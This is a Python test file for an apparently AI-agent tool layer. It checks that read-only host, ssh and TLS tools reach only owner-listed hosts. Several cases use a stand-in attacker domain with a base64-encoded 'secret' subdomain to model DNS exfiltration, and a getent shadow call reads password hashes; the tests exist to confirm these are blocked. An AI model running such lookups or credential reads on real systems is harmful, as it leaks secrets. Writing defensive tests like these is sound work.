"""Сетевой выход читающих вызовов — только к хостам владельца (аудит 25.09, S1)."""
from unittest import mock

import pytest

from app.config import settings
from app.skills.network import is_allowed
from app.skills.readonly import HostAccess, is_read_only, refusal
from skills.host.tools import ACCESS as HOST
from skills.security.tools import tls_check
from skills.ssh.tools import build_access_tools


@pytest.fixture(autouse=True)
def _owner_hosts(monkeypatch):
    monkeypatch.setattr(settings, "network_allowed", "10.0.0.5, Node-1.example., .glowshine.ru")
    monkeypatch.setattr(settings, "monitor_tls_endpoints", "shop.example:443,api.example")
    monkeypatch.setattr(settings, "remnawave_base_url", "https://panel.example/api")


@pytest.mark.parametrize("host", [
    "10.0.0.5", "node-1.example", "NODE-1.EXAMPLE",  # регистр и точка в конце не важны
    "glowshine.ru", "cabinet.glowshine.ru",          # `.домен` — домен и поддомены
    "shop.example", "api.example",                   # TLS-эндпоинты мониторинга
    "panel.example",                                 # панель Remnawave
    "localhost", "127.0.0.1",
])
def test_owner_hosts_are_allowed(host):
    assert is_allowed(host)


@pytest.mark.parametrize("host", [
    "c2VjcmV0.attacker.example", "10.0.0.6", "evilglowshine.ru", "glowshine.ru.evil.example", "",
])
def test_other_hosts_are_not(host):
    assert not is_allowed(host)


@pytest.mark.parametrize("command, read_only", [
    (["getent", "hosts", "c2VjcmV0.attacker.example"], False),  # DNS-запрос наружу
    (["getent", "ahostsv4", "c2VjcmV0.attacker.example"], False),
    (["getent", "hosts", "cabinet.glowshine.ru"], True),
    (["getent", "hosts"], True),                                 # перечисление /etc/hosts
    (["getent", "shadow", "root"], False),                       # хэши паролей
    (["getent", "gshadow"], False),
    (["getent", "passwd", "root"], True),
    (["getent", "group", "docker"], True),
])
def test_getent_reads_only_local_databases_and_owner_hosts(command, read_only):
    assert is_read_only(command, HOST.binaries) is read_only


def test_getent_refusal_says_where_to_go():
    dns = refusal(["getent", "hosts", "x.attacker.example"], HOST.binaries)["error"]
    assert "NETWORK_ALLOWED" in dns and "shell_exec" in dns
    shadow = refusal(["getent", "shadow"], HOST.binaries, "ssh_exec")["error"]
    assert "хэши паролей" in shadow and "ssh_exec" in shadow


async def test_tls_check_refuses_foreign_host_before_connecting():
    with mock.patch("skills.security.tools.host_shell", new=mock.AsyncMock()) as shell:
        out = await tls_check("c2VjcmV0.attacker.example:443")
    assert "NETWORK_ALLOWED" in out["error"]
    shell.assert_not_called()


async def test_tls_check_reaches_owner_host():
    reply = {"returncode": 0, "stdout": "notAfter=Jan  1 00:00:00 2027 GMT", "stderr": ""}
    with mock.patch("skills.security.tools.host_shell", new=mock.AsyncMock(return_value=reply)) as shell:
        out = await tls_check("cabinet.glowshine.ru:443")
    assert "error" not in out
    shell.assert_awaited_once()


@pytest.mark.parametrize("host", ["1.2.3.4", "root@c2VjcmV0.attacker.example"])
async def test_ssh_query_does_not_connect_to_foreign_host(host):
    """Чужой sshd, принимающий любой ключ, получил бы сам текст команды."""
    query = build_access_tools(HostAccess())[0]
    with mock.patch("skills.ssh.tools.shell_exec", new=mock.AsyncMock(return_value={})) as ssh:
        out = await query.execute({"host": host, "command": ["echo", "секрет"]})
    assert "ssh_exec" in out and "NETWORK_ALLOWED" in out
    ssh.assert_not_called()


async def test_ssh_query_reaches_owner_host():
    query = build_access_tools(HostAccess())[0]
    with mock.patch("skills.ssh.tools.shell_exec", new=mock.AsyncMock(return_value={})) as ssh:
        out = await query.execute({"host": "admin@10.0.0.5", "command": ["uptime"]})
    assert "error" not in out
    ssh.assert_awaited_once()
